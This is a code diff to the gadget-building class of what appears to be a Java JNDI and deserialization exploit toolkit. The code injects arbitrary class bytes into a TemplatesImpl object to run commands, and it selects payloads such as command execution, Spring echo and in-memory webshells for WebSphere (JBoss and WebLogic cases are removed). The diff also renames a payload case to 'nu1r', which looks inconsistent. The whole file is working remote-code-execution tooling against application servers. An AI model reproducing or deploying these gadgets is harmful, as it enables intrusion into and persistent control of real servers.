@@ -5,13 +5,9 @@ import com.nu1r.jndi.template.ReverseShellTemplate;
 import com.nu1r.jndi.utils.Cache;
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.template.CommandTemplate;
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
 import java.io.Serializable;
 import java.lang.reflect.*;
@@ -37,20 +33,6 @@ public class Gadgets {
     }
 
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
-
-    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
-
-        private static final long serialVersionUID = -5971610431559700674L;
-
-
-        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
-        }
-
-
-        @Override
-        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
-        }
-    }
 
     // required to make TemplatesImpl happy
     public static class Foo implements Serializable {
@@ -105,7 +87,7 @@ public class Gadgets {
 
         byte[] classBytes = null;
         switch (type) {
-            case command:
+            case nu1r:
                 CommandTemplate commandTemplate = new CommandTemplate(param[0]);
                 classBytes = commandTemplate.getBytes();
                 break;
@@ -123,21 +105,12 @@ public class Gadgets {
             case springecho:
                 classBytes = Cache.get("SpringEchoTemplate");
                 break;
-            case jbossfilter:
-                classBytes = Cache.get("JBossMemshellTemplate");
-                break;
-            case weblogicmemshell1:
-                classBytes = Cache.get("WeblogicMemshellTemplate1");
-                break;
-            case weblogicmemshell2:
-                classBytes = Cache.get("WeblogicMemshellTemplate2");
-                break;
             case webspherememshell:
                 classBytes = Cache.get("WebsphereMemshellTemplate");
                 break;
         }
 
-        // inject class bytes into instance
+        // 将类字节注入实例
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
                 classBytes, ClassFiles.classAsBytes(Foo.class)
         });
